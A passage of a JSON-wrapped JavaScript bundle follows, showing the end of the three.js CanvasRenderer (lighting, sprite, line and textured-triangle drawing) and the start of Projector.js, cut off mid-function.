);\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t/* DEBUG\n\t\t\tsetLineWidth( 1 );\n\t\t\tsetStrokeStyle( 'rgba( 0, 255, 0, 0.5 )' );\n\t\t\t_context.strokeRect( _elemBox.min.x, _elemBox.min.y, _elemBox.max.x - _elemBox.min.x, _elemBox.max.y - _elemBox.min.y );\n\t\t\t*/\n\n\t\t\t_clearBox.union( _elemBox );\n\n\t\t}\n\n\t\t/* DEBUG\n\t\tsetLineWidth( 1 );\n\t\tsetStrokeStyle( 'rgba( 255, 0, 0, 0.5 )' );\n\t\t_context.strokeRect( _clearBox.min.x, _clearBox.min.y, _clearBox.max.x - _clearBox.min.x, _clearBox.max.y - _clearBox.min.y );\n\t\t*/\n\n\t\t_context.setTransform( 1, 0, 0, 1, 0, 0 );\n\n\t};\n\n\t//\n\n\tfunction calculateLights() {\n\n\t\t_ambientLight.setRGB( 0, 0, 0 );\n\t\t_directionalLights.setRGB( 0, 0, 0 );\n\t\t_pointLights.setRGB( 0, 0, 0 );\n\n\t\tfor ( var l = 0, ll = _lights.length; l < ll; l ++ ) {\n\n\t\t\tvar light = _lights[ l ];\n\t\t\tvar lightColor = light.color;\n\n\t\t\tif ( light instanceof THREE.AmbientLight ) {\n\n\t\t\t\t_ambientLight.add( lightColor );\n\n\t\t\t} else if ( light instanceof THREE.DirectionalLight ) {\n\n\t\t\t\t// for sprites\n\n\t\t\t\t_directionalLights.add( lightColor );\n\n\t\t\t} else if ( light instanceof THREE.PointLight ) {\n\n\t\t\t\t// for sprites\n\n\t\t\t\t_pointLights.add( lightColor );\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\tfunction calculateLight( position, normal, color ) {\n\n\t\tfor ( var l = 0, ll = _lights.length; l < ll; l ++ ) {\n\n\t\t\tvar light = _lights[ l ];\n\n\t\t\t_lightColor.copy( light.color );\n\n\t\t\tif ( light instanceof THREE.DirectionalLight ) {\n\n\t\t\t\tvar lightPosition = _vector3.setFromMatrixPosition( light.matrixWorld ).normalize();\n\n\t\t\t\tvar amount = normal.dot( lightPosition );\n\n\t\t\t\tif ( amount <= 0 ) continue;\n\n\t\t\t\tamount *= light.intensity;\n\n\t\t\t\tcolor.add( _lightColor.multiplyScalar( amount ) );\n\n\t\t\t} else if ( light instanceof THREE.PointLight ) {\n\n\t\t\t\tvar lightPosition = _vector3.setFromMatrixPosition( light.matrixWorld );\n\n\t\t\t\tvar amount = normal.dot( _vector3.subVectors( lightPosition, position ).normalize() );\n\n\t\t\t\tif ( amount <= 0 ) continue;\n\n\t\t\t\tamount *= light.distance == 0 ? 1 : 1 - Math.min( position.distanceTo( lightPosition ) / light.distance, 1 );\n\n\t\t\t\tif ( amount == 0 ) continue;\n\n\t\t\t\tamount *= light.intensity;\n\n\t\t\t\tcolor.add( _lightColor.multiplyScalar( amount ) );\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\tfunction renderSprite( v1, element, material ) {\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\tvar scaleX = element.scale.x * _canvasWidthHalf;\n\t\tvar scaleY = element.scale.y * _canvasHeightHalf;\n\n\t\tvar dist = 0.5 * Math.sqrt( scaleX * scaleX + scaleY * scaleY ); // allow for rotated sprite\n\t\t_elemBox.min.set( v1.x - dist, v1.y - dist );\n\t\t_elemBox.max.set( v1.x + dist, v1.y + dist );\n\n\t\tif ( material instanceof THREE.SpriteMaterial ) {\n\n\t\t\tvar texture = material.map;\n\n\t\t\tif ( texture !== null ) {\n\n\t\t\t\tvar pattern = _patterns[ texture.id ];\n\n\t\t\t\tif ( pattern === undefined || pattern.version !== texture.version ) {\n\n\t\t\t\t\tpattern = textureToPattern( texture );\n\t\t\t\t\t_patterns[ texture.id ] = pattern;\n\n\t\t\t\t}\n\n\t\t\t\tif ( pattern.canvas !== undefined ) {\n\n\t\t\t\t\tsetFillStyle( pattern.canvas );\n\n\t\t\t\t\tvar bitmap = texture.image;\n\n\t\t\t\t\tvar ox = bitmap.width * texture.offset.x;\n\t\t\t\t\tvar oy = bitmap.height * texture.offset.y;\n\n\t\t\t\t\tvar sx = bitmap.width * texture.repeat.x;\n\t\t\t\t\tvar sy = bitmap.height * texture.repeat.y;\n\n\t\t\t\t\tvar cx = scaleX / sx;\n\t\t\t\t\tvar cy = scaleY / sy;\n\n\t\t\t\t\t_context.save();\n\t\t\t\t\t_context.translate( v1.x, v1.y );\n\t\t\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t\t\t_context.translate( - scaleX / 2, - scaleY / 2 );\n\t\t\t\t\t_context.scale( cx, cy );\n\t\t\t\t\t_context.translate( - ox, - oy );\n\t\t\t\t\t_context.fillRect( ox, oy, sx, sy );\n\t\t\t\t\t_context.restore();\n\n\t\t\t\t}\n\n\t\t\t} else {\n\n\t\t\t\t// no texture\n\n\t\t\t\tsetFillStyle( material.color.getStyle() );\n\n\t\t\t\t_context.save();\n\t\t\t\t_context.translate( v1.x, v1.y );\n\t\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t\t_context.scale( scaleX, - scaleY );\n\t\t\t\t_context.fillRect( - 0.5, - 0.5, 1, 1 );\n\t\t\t\t_context.restore();\n\n\t\t\t}\n\n\t\t} else if ( material instanceof THREE.SpriteCanvasMaterial ) {\n\n\t\t\tsetStrokeStyle( material.color.getStyle() );\n\t\t\tsetFillStyle( material.color.getStyle() );\n\n\t\t\t_context.save();\n\t\t\t_context.translate( v1.x, v1.y );\n\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t_context.scale( scaleX, scaleY );\n\n\t\t\tmaterial.program( _context );\n\n\t\t\t_context.restore();\n\n\t\t}\n\n\t\t/* DEBUG\n\t\tsetStrokeStyle( 'rgb(255,255,0)' );\n\t\t_context.beginPath();\n\t\t_context.moveTo( v1.x - 10, v1.y );\n\t\t_context.lineTo( v1.x + 10, v1.y );\n\t\t_context.moveTo( v1.x, v1.y - 10 );\n\t\t_context.lineTo( v1.x, v1.y + 10 );\n\t\t_context.stroke();\n\t\t*/\n\n\t}\n\n\tfunction renderLine( v1, v2, element, material ) {\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\t_context.beginPath();\n\t\t_context.moveTo( v1.positionScreen.x, v1.positionScreen.y );\n\t\t_context.lineTo( v2.positionScreen.x, v2.positionScreen.y );\n\n\t\tif ( material instanceof THREE.LineBasicMaterial ) {\n\n\t\t\tsetLineWidth( material.linewidth );\n\t\t\tsetLineCap( material.linecap );\n\t\t\tsetLineJoin( material.linejoin );\n\n\t\t\tif ( material.vertexColors !== THREE.VertexColors ) {\n\n\t\t\t\tsetStrokeStyle( material.color.getStyle() );\n\n\t\t\t} else {\n\n\t\t\t\tvar colorStyle1 = element.vertexColors[ 0 ].getStyle();\n\t\t\t\tvar colorStyle2 = element.vertexColors[ 1 ].getStyle();\n\n\t\t\t\tif ( colorStyle1 === colorStyle2 ) {\n\n\t\t\t\t\tsetStrokeStyle( colorStyle1 );\n\n\t\t\t\t} else {\n\n\t\t\t\t\ttry {\n\n\t\t\t\t\t\tvar grad = _context.createLinearGradient(\n\t\t\t\t\t\t\tv1.positionScreen.x,\n\t\t\t\t\t\t\tv1.positionScreen.y,\n\t\t\t\t\t\t\tv2.positionScreen.x,\n\t\t\t\t\t\t\tv2.positionScreen.y\n\t\t\t\t\t\t);\n\t\t\t\t\t\tgrad.addColorStop( 0, colorStyle1 );\n\t\t\t\t\t\tgrad.addColorStop( 1, colorStyle2 );\n\n\t\t\t\t\t} catch ( exception ) {\n\n\t\t\t\t\t\tgrad = colorStyle1;\n\n\t\t\t\t\t}\n\n\t\t\t\t\tsetStrokeStyle( grad );\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t_context.stroke();\n\t\t\t_elemBox.expandByScalar( material.linewidth * 2 );\n\n\t\t} else if ( material instanceof THREE.LineDashedMaterial ) {\n\n\t\t\tsetLineWidth( material.linewidth );\n\t\t\tsetLineCap( material.linecap );\n\t\t\tsetLineJoin( material.linejoin );\n\t\t\tsetStrokeStyle( material.color.getStyle() );\n\t\t\tsetLineDash( [ material.dashSize, material.gapSize ] );\n\n\t\t\t_context.stroke();\n\n\t\t\t_elemBox.expandByScalar( material.linewidth * 2 );\n\n\t\t\tsetLineDash( [] );\n\n\t\t}\n\n\t}\n\n\tfunction renderFace3( v1, v2, v3, uv1, uv2, uv3, element, material ) {\n\n\t\t_this.info.render.vertices += 3;\n\t\t_this.info.render.faces ++;\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\t_v1x = v1.positionScreen.x; _v1y = v1.positionScreen.y;\n\t\t_v2x = v2.positionScreen.x; _v2y = v2.positionScreen.y;\n\t\t_v3x = v3.positionScreen.x; _v3y = v3.positionScreen.y;\n\n\t\tdrawTriangle( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y );\n\n\t\tif ( ( material instanceof THREE.MeshLambertMaterial || material instanceof THREE.MeshPhongMaterial ) && material.map === null ) {\n\n\t\t\t_diffuseColor.copy( material.color );\n\t\t\t_emissiveColor.copy( material.emissive );\n\n\t\t\tif ( material.vertexColors === THREE.FaceColors ) {\n\n\t\t\t\t_diffuseColor.multiply( element.color );\n\n\t\t\t}\n\n\t\t\t_color.copy( _ambientLight );\n\n\t\t\t_centroid.copy( v1.positionWorld ).add( v2.positionWorld ).add( v3.positionWorld ).divideScalar( 3 );\n\n\t\t\tcalculateLight( _centroid, element.normalModel, _color );\n\n\t\t\t_color.multiply( _diffuseColor ).add( _emissiveColor );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t} else if ( material instanceof THREE.MeshBasicMaterial ||\n\t\t\t\t    material instanceof THREE.MeshLambertMaterial ||\n\t\t\t\t    material instanceof THREE.MeshPhongMaterial ) {\n\n\t\t\tif ( material.map !== null ) {\n\n\t\t\t\tvar mapping = material.map.mapping;\n\n\t\t\t\tif ( mapping === THREE.UVMapping ) {\n\n\t\t\t\t\t_uvs = element.uvs;\n\t\t\t\t\tpatternPath( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y, _uvs[ uv1 ].x, _uvs[ uv1 ].y, _uvs[ uv2 ].x, _uvs[ uv2 ].y, _uvs[ uv3 ].x, _uvs[ uv3 ].y, material.map );\n\n\t\t\t\t}\n\n\t\t\t} else if ( material.envMap !== null ) {\n\n\t\t\t\tif ( material.envMap.mapping === THREE.SphericalReflectionMapping ) {\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv1 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv1x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv1y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv2 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv2x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv2y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv3 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv3x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv3y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\tpatternPath( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y, _uv1x, _uv1y, _uv2x, _uv2y, _uv3x, _uv3y, material.envMap );\n\n\t\t\t\t}\n\n\t\t\t} else {\n\n\t\t\t\t_color.copy( material.color );\n\n\t\t\t\tif ( material.vertexColors === THREE.FaceColors ) {\n\n\t\t\t\t\t_color.multiply( element.color );\n\n\t\t\t\t}\n\n\t\t\t\tmaterial.wireframe === true\n\t\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t\t : fillPath( _color );\n\n\t\t\t}\n\n\t\t} else if ( material instanceof THREE.MeshNormalMaterial ) {\n\n\t\t\t_normal.copy( element.normalModel ).applyMatrix3( _normalViewMatrix );\n\n\t\t\t_color.setRGB( _normal.x, _normal.y, _normal.z ).multiplyScalar( 0.5 ).addScalar( 0.5 );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t} else {\n\n\t\t\t_color.setRGB( 1, 1, 1 );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t}\n\n\t}\n\n\t//\n\n\tfunction drawTriangle( x0, y0, x1, y1, x2, y2 ) {\n\n\t\t_context.beginPath();\n\t\t_context.moveTo( x0, y0 );\n\t\t_context.lineTo( x1, y1 );\n\t\t_context.lineTo( x2, y2 );\n\t\t_context.closePath();\n\n\t}\n\n\tfunction strokePath( color, linewidth, linecap, linejoin ) {\n\n\t\tsetLineWidth( linewidth );\n\t\tsetLineCap( linecap );\n\t\tsetLineJoin( linejoin );\n\t\tsetStrokeStyle( color.getStyle() );\n\n\t\t_context.stroke();\n\n\t\t_elemBox.expandByScalar( linewidth * 2 );\n\n\t}\n\n\tfunction fillPath( color ) {\n\n\t\tsetFillStyle( color.getStyle() );\n\t\t_context.fill();\n\n\t}\n\n\tfunction textureToPattern( texture ) {\n\n\t\tif ( texture.version === 0 ||\n\t\t\ttexture instanceof THREE.CompressedTexture ||\n\t\t\ttexture instanceof THREE.DataTexture ) {\n\n\t\t\treturn {\n\t\t\t\tcanvas: undefined,\n\t\t\t\tversion: texture.version\n\t\t\t};\n\n\t\t}\n\n\t\tvar image = texture.image;\n\n\t\tif ( image.complete === false ) {\n\n\t\t\treturn {\n\t\t\t\tcanvas: undefined,\n\t\t\t\tversion: 0\n\t\t\t};\n\n\t\t}\n\n\t\tvar repeatX = texture.wrapS === THREE.RepeatWrapping || texture.wrapS === THREE.MirroredRepeatWrapping;\n\t\tvar repeatY = texture.wrapT === THREE.RepeatWrapping || texture.wrapT === THREE.MirroredRepeatWrapping;\n\n\t\tvar mirrorX = texture.wrapS === THREE.MirroredRepeatWrapping;\n\t\tvar mirrorY = texture.wrapT === THREE.MirroredRepeatWrapping;\n\n\t\t//\n\n\t\tvar canvas = document.createElement( 'canvas' );\n\t\tcanvas.width = image.width * ( mirrorX ? 2 : 1 );\n\t\tcanvas.height = image.height * ( mirrorY ? 2 : 1 );\n\n\t\tvar context = canvas.getContext( '2d' );\n\t\tcontext.setTransform( 1, 0, 0, - 1, 0, image.height );\n\t\tcontext.drawImage( image, 0, 0 );\n\n\t\tif ( mirrorX === true ) {\n\n\t\t\tcontext.setTransform( - 1, 0, 0, - 1, image.width, image.height );\n\t\t\tcontext.drawImage( image, - image.width, 0 );\n\n\t\t}\n\n\t\tif ( mirrorY === true ) {\n\n\t\t\tcontext.setTransform( 1, 0, 0, 1, 0, 0 );\n\t\t\tcontext.drawImage( image, 0, image.height );\n\n\t\t}\n\n\t\tif ( mirrorX === true && mirrorY === true ) {\n\n\t\t\tcontext.setTransform( - 1, 0, 0, 1, image.width, 0 );\n\t\t\tcontext.drawImage( image, - image.width, image.height );\n\n\t\t}\n\n\t\tvar repeat = 'no-repeat';\n\n\t\tif ( repeatX === true && repeatY === true ) {\n\n\t\t\trepeat = 'repeat';\n\n\t\t} else if ( repeatX === true ) {\n\n\t\t\trepeat = 'repeat-x';\n\n\t\t} else if ( repeatY === true ) {\n\n\t\t\trepeat = 'repeat-y';\n\n\t\t}\n\n\t\tvar pattern = _context.createPattern( canvas, repeat );\n\n\t\tif ( texture.onUpdate ) texture.onUpdate( texture );\n\n\t\treturn {\n\t\t\tcanvas: pattern,\n\t\t\tversion: texture.version\n\t\t};\n\n\t}\n\n\tfunction patternPath( x0, y0, x1, y1, x2, y2, u0, v0, u1, v1, u2, v2, texture ) {\n\n\t\tvar pattern = _patterns[ texture.id ];\n\n\t\tif ( pattern === undefined || pattern.version !== texture.version ) {\n\n\t\t\tpattern = textureToPattern( texture );\n\t\t\t_patterns[ texture.id ] = pattern;\n\n\t\t}\n\n\t\tif ( pattern.canvas !== undefined ) {\n\n\t\t\tsetFillStyle( pattern.canvas );\n\n\t\t} else {\n\n\t\t\tsetFillStyle( 'rgba( 0, 0, 0, 1)' );\n\t\t\t_context.fill();\n\t\t\treturn;\n\n\t\t}\n\n\t\t// http://extremelysatisfactorytotalitarianism.com/blog/?p=2120\n\n\t\tvar a, b, c, d, e, f, det, idet,\n\t\toffsetX = texture.offset.x / texture.repeat.x,\n\t\toffsetY = texture.offset.y / texture.repeat.y,\n\t\twidth = texture.image.width * texture.repeat.x,\n\t\theight = texture.image.height * texture.repeat.y;\n\n\t\tu0 = ( u0 + offsetX ) * width;\n\t\tv0 = ( v0 + offsetY ) * height;\n\n\t\tu1 = ( u1 + offsetX ) * width;\n\t\tv1 = ( v1 + offsetY ) * height;\n\n\t\tu2 = ( u2 + offsetX ) * width;\n\t\tv2 = ( v2 + offsetY ) * height;\n\n\t\tx1 -= x0; y1 -= y0;\n\t\tx2 -= x0; y2 -= y0;\n\n\t\tu1 -= u0; v1 -= v0;\n\t\tu2 -= u0; v2 -= v0;\n\n\t\tdet = u1 * v2 - u2 * v1;\n\n\t\tif ( det === 0 ) return;\n\n\t\tidet = 1 / det;\n\n\t\ta = ( v2 * x1 - v1 * x2 ) * idet;\n\t\tb = ( v2 * y1 - v1 * y2 ) * idet;\n\t\tc = ( u1 * x2 - u2 * x1 ) * idet;\n\t\td = ( u1 * y2 - u2 * y1 ) * idet;\n\n\t\te = x0 - a * u0 - c * v0;\n\t\tf = y0 - b * u0 - d * v0;\n\n\t\t_context.save();\n\t\t_context.transform( a, b, c, d, e, f );\n\t\t_context.fill();\n\t\t_context.restore();\n\n\t}\n\n\tfunction clipImage( x0, y0, x1, y1, x2, y2, u0, v0, u1, v1, u2, v2, image ) {\n\n\t\t// http://extremelysatisfactorytotalitarianism.com/blog/?p=2120\n\n\t\tvar a, b, c, d, e, f, det, idet,\n\t\twidth = image.width - 1,\n\t\theight = image.height - 1;\n\n\t\tu0 *= width; v0 *= height;\n\t\tu1 *= width; v1 *= height;\n\t\tu2 *= width; v2 *= height;\n\n\t\tx1 -= x0; y1 -= y0;\n\t\tx2 -= x0; y2 -= y0;\n\n\t\tu1 -= u0; v1 -= v0;\n\t\tu2 -= u0; v2 -= v0;\n\n\t\tdet = u1 * v2 - u2 * v1;\n\n\t\tidet = 1 / det;\n\n\t\ta = ( v2 * x1 - v1 * x2 ) * idet;\n\t\tb = ( v2 * y1 - v1 * y2 ) * idet;\n\t\tc = ( u1 * x2 - u2 * x1 ) * idet;\n\t\td = ( u1 * y2 - u2 * y1 ) * idet;\n\n\t\te = x0 - a * u0 - c * v0;\n\t\tf = y0 - b * u0 - d * v0;\n\n\t\t_context.save();\n\t\t_context.transform( a, b, c, d, e, f );\n\t\t_context.clip();\n\t\t_context.drawImage( image, 0, 0 );\n\t\t_context.restore();\n\n\t}\n\n\t// Hide anti-alias gaps\n\n\tfunction expand( v1, v2, pixels ) {\n\n\t\tvar x = v2.x - v1.x, y = v2.y - v1.y,\n\t\tdet = x * x + y * y, idet;\n\n\t\tif ( det === 0 ) return;\n\n\t\tidet = pixels / Math.sqrt( det );\n\n\t\tx *= idet; y *= idet;\n\n\t\tv2.x += x; v2.y += y;\n\t\tv1.x -= x; v1.y -= y;\n\n\t}\n\n\t// Context cached methods.\n\n\tfunction setOpacity( value ) {\n\n\t\tif ( _contextGlobalAlpha !== value ) {\n\n\t\t\t_context.globalAlpha = value;\n\t\t\t_contextGlobalAlpha = value;\n\n\t\t}\n\n\t}\n\n\tfunction setBlending( value ) {\n\n\t\tif ( _contextGlobalCompositeOperation !== value ) {\n\n\t\t\tif ( value === THREE.NormalBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'source-over';\n\n\t\t\t} else if ( value === THREE.AdditiveBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'lighter';\n\n\t\t\t} else if ( value === THREE.SubtractiveBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'darker';\n\n\t\t\t} else if ( value === THREE.MultiplyBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'multiply';\n\n\t\t\t}\n\n\t\t\t_contextGlobalCompositeOperation = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineWidth( value ) {\n\n\t\tif ( _contextLineWidth !== value ) {\n\n\t\t\t_context.lineWidth = value;\n\t\t\t_contextLineWidth = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineCap( value ) {\n\n\t\t// \"butt\", \"round\", \"square\"\n\n\t\tif ( _contextLineCap !== value ) {\n\n\t\t\t_context.lineCap = value;\n\t\t\t_contextLineCap = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineJoin( value ) {\n\n\t\t// \"round\", \"bevel\", \"miter\"\n\n\t\tif ( _contextLineJoin !== value ) {\n\n\t\t\t_context.lineJoin = value;\n\t\t\t_contextLineJoin = value;\n\n\t\t}\n\n\t}\n\n\tfunction setStrokeStyle( value ) {\n\n\t\tif ( _contextStrokeStyle !== value ) {\n\n\t\t\t_context.strokeStyle = value;\n\t\t\t_contextStrokeStyle = value;\n\n\t\t}\n\n\t}\n\n\tfunction setFillStyle( value ) {\n\n\t\tif ( _contextFillStyle !== value ) {\n\n\t\t\t_context.fillStyle = value;\n\t\t\t_contextFillStyle = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineDash( value ) {\n\n\t\tif ( _contextLineDash.length !== value.length ) {\n\n\t\t\t_context.setLineDash( value );\n\t\t\t_contextLineDash = value;\n\n\t\t}\n\n\t}\n\n};\n"},{"url":"/lib/three/lib/Projector.js","content":"/**\n * @author mrdoob / http://mrdoob.com/\n * @author supereggbert / http://www.paulbrunt.co.uk/\n * @author julianwa / https://github.com/julianwa\n */\n\nTHREE.RenderableObject = function () {\n\n\tthis.id = 0;\n\n\tthis.object = null;\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableFace = function () {\n\n\tthis.id = 0;\n\n\tthis.v1 = new THREE.RenderableVertex();\n\tthis.v2 = new THREE.RenderableVertex();\n\tthis.v3 = new THREE.RenderableVertex();\n\n\tthis.normalModel = new THREE.Vector3();\n\n\tthis.vertexNormalsModel = [ new THREE.Vector3(), new THREE.Vector3(), new THREE.Vector3() ];\n\tthis.vertexNormalsLength = 0;\n\n\tthis.color = new THREE.Color();\n\tthis.material = null;\n\tthis.uvs = [ new THREE.Vector2(), new THREE.Vector2(), new THREE.Vector2() ];\n\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableVertex = function () {\n\n\tthis.position = new THREE.Vector3();\n\tthis.positionWorld = new THREE.Vector3();\n\tthis.positionScreen = new THREE.Vector4();\n\n\tthis.visible = true;\n\n};\n\nTHREE.RenderableVertex.prototype.copy = function ( vertex ) {\n\n\tthis.positionWorld.copy( vertex.positionWorld );\n\tthis.positionScreen.copy( vertex.positionScreen );\n\n};\n\n//\n\nTHREE.RenderableLine = function () {\n\n\tthis.id = 0;\n\n\tthis.v1 = new THREE.RenderableVertex();\n\tthis.v2 = new THREE.RenderableVertex();\n\n\tthis.vertexColors = [ new THREE.Color(), new THREE.Color() ];\n\tthis.material = null;\n\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableSprite = function () {\n\n\tthis.id = 0;\n\n\tthis.object = null;\n\n\tthis.x = 0;\n\tthis.y = 0;\n\tthis.z = 0;\n\n\tthis.rotation = 0;\n\tthis.scale = new THREE.Vector2();\n\n\tthis.material = null;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.Projector = function () {\n\n\tvar _object, _objectCount, _objectPool = [], _objectPoolLength = 0,\n\t_vertex, _vertexCount, _vertexPool = [], _vertexPoolLength = 0,\n\t_face, _faceCount, _facePool = [], _facePoolLength = 0,\n\t_line, _lineCount, _linePool = [], _linePoolLength = 0,\n\t_sprite, _spriteCount, _spritePool = [], _spritePoolLength = 0,\n\n\t_renderData = { objects: [], lights: [], elements: [] },\n\n\t_vector3 = new THREE.Vector3(),\n\t_vector4 = new THREE.Vector4(),\n\n\t_clipBox = new THREE.Box3( new THREE.Vector3( - 1, - 1, - 1 ), new THREE.Vector3( 1, 1, 1 ) ),\n\t_boundingBox = new THREE.Box3(),\n\t_points3 = new Array( 3 ),\n\t_points4 = new Array( 4 ),\n\n\t_viewMatrix = new THREE.Matrix4(),\n\t_viewProjectionMatrix = new THREE.Matrix4(),\n\n\t_modelMatrix,\n\t_modelViewProjectionMatrix = new THREE.Matrix4(),\n\n\t_normalMatrix = new THREE.Matrix3(),\n\n\t_frustum = new THREE.Frustum(),\n\n\t_clippedVertex1PositionScreen = new THREE.Vector4(),\n\t_clippedVertex2PositionScreen = new THREE.Vector4();\n\n\t//\n\n\tthis.projectVector = function ( vector, camera ) {\n\n\t\tconsole.warn( 'THREE.Projector: .projectVector() is now vector.project().' );\n\t\tvector.project( camera );\n\n\t};\n\n\tthis.unprojectVector = function ( vector, camera ) {\n\n\t\tconsole.warn( 'THREE.Projector: .unprojectVector() is now vector.unproject().' );\n\t\tvector.unproject( camera );\n\n\t};\n\n\tthis.pickingRay = function ( vector, camera ) {\n\n\t\tconsole.error( 'THREE.Projector: .pickingRay() is now raycaster.setFromCamera().' );\n\n\t};\n\n\t//\n\n\tvar RenderList = function () {\n\n\t\tvar normals = [];\n\t\tvar uvs = [];\n\n\t\tvar object = null;\n\t\tvar material = null;\n\n\t\tvar normalMatrix = new THREE.Matrix3();\n\n\t\tfunction setObject( value ) {\n\n\t\t\tobject = value;\n\t\t\tmaterial = object.material;\n\n\t\t\tnormalMatrix.getNormalMatrix( object.matrixWorld );\n\n\t\t\tnormals.length = 0;\n\t\t\tuvs.length = 0;\n\n\t\t}\n\n\t\tfunction projectVertex( vertex ) {\n\n\t\t\tvar position = vertex.position;\n\t\t\tvar positionWorld = vertex.positionWorld;\n\t\t\tvar positionScreen = vertex.positionScreen;\n\n\t\t\tpositionWorld.copy( position ).applyMatrix4( _modelMatrix );\n\t\t\tpositionScreen.copy( positionWorld ).applyMatrix4( _viewProjectionMatrix );\n\n\t\t\tvar invW = 1 / positionScreen.w;\n\n\t\t\tpositionScreen.x *= invW;\n\t\t\tpositionScreen.y *= invW;\n\t\t\tpositionScreen.z *= invW;\n\n\t\t\tvertex.visible = positionScreen.x >= - 1 && positionScreen.x <= 1 &&\n\t\t\t\t\t positionScreen.y >= - 1 && positionScreen.y <= 1 &&\n\t\t\t\t\t positionScreen.z >= - 1 && positionScreen.z <= 1;\n\n\t\t}\n\n\t\tfunction pushVertex( x, y, z ) {\n\n\t\t\t_vertex = getNextVertexInPool();\n\t\t\t_vertex.position.set( x, y, z );\n\n\t\t\tprojectVertex( _vertex );\n\n\t\t}\n\n\t\tfunction pushNormal( x, y, z ) {\n\n\t\t\tnormals.push( x, y, z );\n\n\t\t}\n\n\t\tfunction pushUv( x, y ) {\n\n\t\t\tuvs.push( x, y );\n\n\t\t}\n\n\t\tfunction checkTriangleVisibility( v1, v2, v3 ) {\n\n\t\t\tif ( v1.visible === true || v2.visible === true || v3.visible === true ) return true;\n\n\t\t\t_points3[ 0 ] = v1.positionScreen;\n\t\t\t_points3[ 1 ] = v2.positionScreen;\n\t\t\t_points3[ 2 ] = v3.positionScreen;\n\n\t\t\treturn _clipBox.intersectsBox( _boundingBox.setFromPoints( _points3 ) );\n\n\t\t}\n\n\t\tfunction checkBackfaceCulling( v1, v2, v3 ) {\n\n\t\t\treturn ( ( v3.positionScreen.x - v1.positionScreen.x ) *\n\t\t\t\t    ( v2.positionScreen.y - v1.positionScreen.y ) -\n\t\t\t\t    ( v3.positionScreen.y - v1.positionScreen.y ) *\n\t\t\t\t    ( v2.positionScreen.x - v1.positionScreen.x ) ) < 0;\n\n\t\t}\n\n\t\tfunction pushLine( a, b ) {\n\n\t\t\tvar v1 = _vertexPool[ a ];\n\t\t\tvar v2 = _vertexPool[ b ];\n\n\t\t\t_line = getNextLineInPool();\n\n\t\t\t_line.id = object.id;\n\t\t\t_line.v1.copy( v1 );\n\t\t\t_line.v2.copy( v2 );\n\t\t\t_line.z = ( v1.positionScreen.z + v2.positionScreen.z ) / 2;\n\t\t\t_line.renderOrder = object.renderOrder;\n\n\t\t\t_line.material = object.material;\n\n\t\t\t_renderData.elements.push( _line );\n\n\t\t}\n\n\t\tfunction pushTriangle( a, b, c ) {\n\n\t\t\tvar v1 = _vertexPool[ a ];\n\t\t\tvar v2 = _vertexPool[ b ];\n\t\t\tvar v3 = _vertexPool[ c ];\n\n\t\t\tif ( checkTriangleVisibility( v1, v2, v3 ) === false ) return;\n\n\t\t\tif ( material.side === THREE.DoubleSide || checkBackfaceCulling( v1, v2, v3 ) === true ) {\n\n\t\t\t\t_face = getNextFaceInPool();\n\n\t\t\t\t_face.id = object.id;\n\t\t\t\t_face.v1.copy( v1 );\n\t\t\t\t_face.v2.copy( v2 );\n\t\t\t\t_face.v3.copy( v3 );\n\t\t\t\t_face.z = ( v1.positionScreen.z + v2.positionScreen.z + v3.positionScreen.z ) / 3;\n\t\t\t\t_face.renderOrder = object.renderOrder;\n\n\t\t\t\t// use first vertex normal as face normal\n\n\t\t\t\t_face.normalModel.fromArray( normals, a * 3 